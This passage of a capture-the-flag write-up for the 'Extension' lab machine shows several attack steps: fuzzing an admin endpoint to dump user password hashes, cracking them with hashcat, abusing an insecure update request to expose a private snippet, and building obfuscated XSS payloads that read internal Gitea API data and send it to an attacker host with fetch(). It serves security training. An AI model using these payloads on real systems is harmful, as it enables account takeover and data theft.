+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>            <span class="st">"methods"</span><span class="op">:</span> [<span class="st">"POST"</span>]</span>
+<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>        }<span class="op">,</span></span>
+<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>        <span class="st">"admin.management.dump"</span><span class="op">:</span> {</span>
+<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>            <span class="st">"uri"</span><span class="op">:</span> <span class="st">"management</span><span class="sc">\/</span><span class="st">dump"</span><span class="op">,</span></span>
+<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a>            <span class="st">"methods"</span><span class="op">:</span> [<span class="st">"POST"</span>]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Funtion <code>admin.management.dump</code> seems very interesting, we can only reach it through POST so we have to play around with cURL / fuff / Burp.</p>
+<p>Here I was stuck for a while trying to fuzz the data object, I know that I need to include the <strong>Cookie-</strong>, <strong>X-XSRF-TOKEN</strong>- and <strong>Content-type</strong> headers, but when it comes to the data object I am clueless. After fuzzing the key and filtering with Burp I finally managed to find something:</p>
+<p><strong>Request:</strong></p>
+<p><img src="images/extension04.png" class="img-fluid"></p>
+<p><strong>Response:</strong></p>
+<p><img src="images/extension05.png" class="img-fluid"></p>
+<p>The key <strong>download</strong> returns <em>“Unknown tablename”</em> while all other keys return <em>“Missing arguments”</em>, we’ve got something! Lets continue to fuzz the value field and we quickly find the variable <em>users</em>, from which we extract 800+ users with their password hash.</p>
+<p><img src="images/extension06.png" class="img-fluid"></p>
+</section>
+<section id="step-2" class="level3">
+<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
+<p>Copy all json data to file and format it using <code>json.tool</code>:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension python3 <span class="at">-m</span> json.tool temp_download_users.json <span class="op">&gt;</span> snippet_users.json</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Looking for high value targets we find that <code>Charlie</code> is the only <em>manager</em> on the site:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension cat snippet_users.json <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-B10</span> Manager</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    {</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>        <span class="st">"id"</span>: 1,</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>        <span class="er">"name":</span> <span class="er">"Charlie</span> <span class="ex">Rooper</span><span class="st">",</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span><span class="ex">email</span><span class="st">": "</span><span class="ex">charlie@snippet.htb</span><span class="st">",</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span><span class="ex">email_verified_at</span><span class="st">": "</span><span class="ex">2022-01-02</span> 20:12:46<span class="st">",</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>password<span class="st">": "</span>30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82<span class="st">",</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>remember_token<span class="st">": "</span>T8hTcYuS7ULTi73eYg7ZHhncyNucDKQb3VaUDfcotdEGaDESr3YsP9xUlJEQ<span class="st">",</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>created_at<span class="st">": "</span>2022-01-02 20:12:47<span class="st">",</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>updated_at<span class="st">": "</span>2022-06-20 14:46:28<span class="st">",</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>user_type<span class="st">": "</span>Manager<span class="st">"</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Jean that we also found earlier is a member, her hash/token/information might come in handy later on.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension cat snippet_users.json <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-a10</span> jean</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">{</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>        <span class="st">"id"</span><span class="ex">:</span> 664,</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>        <span class="st">"name"</span><span class="ex">:</span> <span class="st">"Jean Castux"</span>,</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>        <span class="st">"email"</span><span class="ex">:</span> <span class="st">"jean@snippet.htb"</span>,</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>        <span class="st">"email_verified_at"</span><span class="ex">:</span> <span class="st">"2022-01-02 20:15:30"</span>,</span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>        <span class="st">"password"</span><span class="ex">:</span> <span class="st">"7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6"</span>,</span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>        <span class="st">"remember_token"</span><span class="ex">:</span> <span class="st">"naXzYffXKP"</span>,</span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>        <span class="st">"created_at"</span><span class="ex">:</span> <span class="st">"2022-01-02 20:15:37"</span>,</span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>        <span class="st">"updated_at"</span><span class="ex">:</span> <span class="st">"2022-01-02 20:15:37"</span>,</span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>        <span class="st">"user_type"</span><span class="ex">:</span> <span class="st">"Member"</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">},</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Trying to crack all hashes we only get one hit:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension grep password snippet_users.json <span class="kw">|</span> <span class="fu">awk</span> <span class="at">-F\"</span> <span class="st">'{print $4}'</span> <span class="op">&gt;</span> tmp_hashes</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension grep <span class="st">'email"'</span> snippet_users.json <span class="kw">|</span> <span class="fu">awk</span> <span class="at">-F\"</span> <span class="st">'{print $4}'</span> <span class="op">&gt;</span> tmp_email</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension paste <span class="at">-d</span> <span class="st">":"</span> tmp_email tmp_hashes <span class="op">&gt;</span> snippet_users.hash</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension hashcat <span class="at">-a0</span> <span class="at">-m1400</span> snippet_users.hash /usr/share/wordlists/rockyou.txt <span class="at">--user</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="ex">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension hashcat <span class="at">-a0</span> <span class="at">-m1400</span> snippet_users.hash /usr/share/wordlists/rockyou.txt <span class="at">--user</span> <span class="at">--show</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="ex">letha@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="ex">fredrick@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="ex">gia@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="ex">juliana@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Testing to login with credentials <code>letha@snippet.htb:password123</code> and we gain access to the application:</p>
+<p><img src="images/extension07.png" class="img-fluid"></p>
+<p>Browsing snippets we find one public (<code>http://snippet.htb/snippets/1</code>) from <em>Isaac Heller</em> named <em>“JavaScript get clipboard”</em>:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode js code-with-copy"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">getClipBoard</span>() {</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> el <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createElement</span>(<span class="st">"div"</span>)<span class="op">;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="fu">appendChild</span>(el)<span class="op">;</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    el<span class="op">.</span><span class="at">contentEditable</span> <span class="op">=</span> <span class="kw">true</span><span class="op">;</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>    el<span class="op">.</span><span class="at">style</span> <span class="op">=</span> {<span class="dt">position</span><span class="op">:</span> <span class="st">'absolute'</span><span class="op">,</span> <span class="dt">left</span><span class="op">:</span> <span class="st">'-9999px'</span>}<span class="op">;</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> range <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createRange</span>()<span class="op">;</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    range<span class="op">.</span><span class="fu">selectNode</span>(el)<span class="op">;</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>    <span class="bu">window</span><span class="op">.</span><span class="fu">getSelection</span>()<span class="op">.</span><span class="fu">removeAllRanges</span>()<span class="op">;</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">window</span><span class="op">.</span><span class="fu">getSelection</span>()<span class="op">.</span><span class="fu">addRange</span>(range)<span class="op">;</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>    el<span class="op">.</span><span class="fu">focus</span>()<span class="op">;</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="fu">execCommand</span>(<span class="st">"paste"</span>)<span class="op">;</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> el<span class="op">.</span><span class="at">innerHTML</span><span class="op">;</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Browsing to <code>http://snippet.htb/snippets/2</code> we find another snippet from <strong>Jean</strong> named <em>“Gitea API”</em>, however we’re not authorized to view it.</p>
+</section>
+<section id="step-3" class="level3">
+<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
+<p>The application is vulnerable to a pretty simple exploit where we utilize the edit function. Create a new snippet, the content is irrelevant, and head over to <em>Browse Snippets</em>. Press edit and <em>UPDATE</em> without editing to capture the POST request in Burp.</p>
+<p>The post body will look something like this:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span><span class="dt">"name"</span><span class="fu">:</span><span class="st">"sdf"</span><span class="fu">,</span><span class="dt">"content"</span><span class="fu">:</span><span class="st">"I only write in D"</span><span class="fu">,</span><span class="dt">"language"</span><span class="fu">:</span><span class="st">"D"</span><span class="fu">,</span><span class="dt">"public"</span><span class="fu">:</span><span class="kw">true</span><span class="fu">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Now simply remove everything except <code>"public":true</code> and change the address from <code>/snippets/update/&lt;id&gt;</code> to <code>/snippets/update/2</code> to make Jean’s snippet public.</p>
+<p><img src="images/extension08.png" class="img-fluid"></p>
+<p>Decode the token to reveal Jeans credentials:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension echo <span class="at">-n</span> <span class="st">"amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB"</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">jean:EHmfar1Y7ppA9O5TAIXnYnJpA</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>With Jeans credentials we’re now able to access her email (<code>mail.snippet.htb</code>) and git (<code>dev.snippet.htb</code>), however SSH only accepts publickey.</p>
+<p>Logging into git we find an extension designed display the body of issues posted on internal repos, meaning we can post data that will be read by other team members. Looking through the code (<code>inject.js</code>) we find this filter in the end:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span><span class="fu"> check</span><span class="kw">(</span><span class="ex">str</span><span class="kw">)</span> <span class="kw">{</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">//</span> remove tags</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">str</span> = str.replace<span class="er">(</span><span class="ex">/</span><span class="op">&lt;</span>.<span class="pp">*?</span><span class="op">&gt;</span>/, <span class="st">""</span><span class="kw">)</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">const</span> filter = [<span class="st">";"</span>, <span class="st">"\'"</span>, <span class="st">"("</span>, <span class="st">")"</span>, <span class="st">"src"</span>, <span class="st">"script"</span>, <span class="st">"&amp;"</span>, <span class="st">"|"</span>, <span class="st">"["</span>, <span class="st">"]"</span>]</span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="kw">(</span><span class="ex">const</span> i of filter<span class="kw">)</span> <span class="kw">{</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">(</span><span class="ex">str.includes</span><span class="er">(</span><span class="ex">i</span><span class="kw">))</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="st">""</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">}</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="ex">str</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The first <code>&lt;&gt;</code> tag is replaced with <code>""</code>, this only happens once since it’s not in a loop. Other then that, a bunch of words and characters are also filtered. The big thing here is the semi-colon as it removes most of the “standard” ways to steal cookies.</p>
+<p>To test if we can get this XSS to work, I use this simple payload and wait for callbacks. <code>&lt;replace-me&gt;&lt;img sRc="http://10.10.14.10?c=hello.xss" /&gt;</code></p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension python3 <span class="at">-m</span> http.server 80</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er">(</span><span class="ex">http://0.0.0.0:80/</span><span class="kw">)</span> <span class="ex">...</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.14.10</span> <span class="at">-</span> <span class="at">-</span> [08/Sep/2022 14:28:28] <span class="st">"GET /?c=hello.xss HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [08/Sep/2022 14:30:32] <span class="st">"GET /?c=hello.xss HTTP/1.1"</span> 200 <span class="at">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Now we just need to figure out what to steal, and how to do it.</p>
+</section>
+<section id="step-4" class="level3">
+<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
+<p>Here we have a few rules to follow, no parentheses and no semi colons. Googling around for <em>XSS without parentheses</em> I come across <a href="https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md">this gold mine</a> or different XSS payloads. With a lot of trial and error and over 100+ tries later I finally succeed to find a payload that allows me to <code>fetch()</code> with my XSS:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Payload to b64 encode</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">fetch</span><span class="er">(</span><span class="st">'http://10.10.14.10/just-fetch'</span><span class="kw">)</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="co">## Issues body</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>remove-me<span class="op">&gt;&lt;</span>img <span class="va">sRc</span><span class="op">=</span><span class="st">"e"</span> <span class="va">onerror</span><span class="op">=</span>eval.call<span class="kw">`</span><span class="va">${</span><span class="er">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9qdXN0LWZldGNoJykK`\x29"</span><span class="va">}</span><span class="kw">`</span><span class="op">&gt;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="co">## HTTP Server</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [09/Sep/2022 14:30:53] <span class="st">"GET /just-fetch HTTP/1.1"</span> 404 <span class="at">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Expanding on the PoC I try to fetch the content of text file that I host, and then fetch again to “send” the data base64 encoded in the URL.</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension echo <span class="st">"fetch('http://10.10.14.10/employees.txt').then(response =&gt; response.text()).then(data =&gt; fetch('http://10.10.14.10/'+btoa(data)))"</span> <span class="kw">|</span> <span class="fu">base64</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEw</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="va">LycrYnRvYShkYXRhKSkpCg</span><span class="op">=</span>=</span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="co">## Issues body</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>remove-me<span class="op">&gt;&lt;</span>img <span class="va">sRc</span><span class="op">=</span><span class="st">"e"</span> <span class="va">onerror</span><span class="op">=</span>eval.call<span class="kw">`</span><span class="va">${</span><span class="er">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEwLycrYnRvYShkYXRhKSkpCg==`\x29"</span><span class="va">}</span><span class="kw">`</span><span class="op">&gt;</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="co">## HTTP Server</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [09/Sep/2022 15:28:29] <span class="st">"GET /Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo= HTTP/1.1"</span> 404 <span class="at">-</span></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension echo <span class="st">"Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo="</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Charlie</span> Rooper</span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Jean</span> Castux</span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Thierry</span> Halliday</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We got a solid XSS PoC where we’re able to exfiltrate data now we need to find a way to exploit this. Looking through the Gitea <a href="http://dev.snippet.htb/api/swagger/">API docs</a> we have a lot of options, the first that comes to mind is <em>“GET /user”</em> to show the authenticated user - in theory this should confirm what user is performing the XSS actions. To get a better understanding of the user performing my XSS calls lets see if we can extract any repo information using <code>http://dev.snippet.htb/api/v1/repos/search</code>.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Issues body</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>remove-me<span class="op">&gt;&lt;</span>img <span class="va">sRc</span><span class="op">=</span><span class="st">"e"</span> <span class="va">onerror</span><span class="op">=</span>eval.call<span class="kw">`</span><span class="va">${</span><span class="er">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL3NlYXJjaCcpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"</span><span class="va">}</span><span class="kw">`</span><span class="op">&gt;</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="co">## HTTP Server</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [10/Sep/2022 10:05:49] <span class="st">"GET /eyJvayI6 [... snip ...]</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension echo "</span>eyJvayI6 [... snip ...]<span class="st">" | base64 -d &gt; tmp_repos.txt</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension python3 -m json.tool tmp_repos.txt &gt; xss_repos.json</span></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension cat xss_repos.json </span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a><span class="st">{</span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a><span class="st">    "</span>ok<span class="st">": true,</span></span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a><span class="st">    "</span>data<span class="st">": [</span></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a><span class="st">        {</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>id<span class="st">": 2,</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>owner<span class="st">": {</span></span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a><span class="st">                [... snip ...]</span></span>
+<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a><span class="st">                "</span>username<span class="st">": "</span>charlie<span class="st">"</span></span>
+<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a><span class="st">            },</span></span>
+<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>name<span class="st">": "</span>backups<span class="st">",</span></span>
+<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>full_name<span class="st">": "</span>charlie/backups<span class="st">",</span></span>
+<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>description<span class="st">": "</span>Backup of my home directory<span class="st">",</span></span>
+<span id="cb17-22"><a href="#cb17-22" aria-hidden="true" tabindex="-1"></a><span class="st">            [... snip ...]</span></span>
+<span id="cb17-23"><a href="#cb17-23" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>html_url<span class="st">": "</span>http://dev.snippet.htb/charlie/backups<span class="st">",</span></span>
+<span id="cb17-24"><a href="#cb17-24" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>ssh_url<span class="st">": "</span>git@localhost:charlie/backups.git<span class="st">",</span></span>
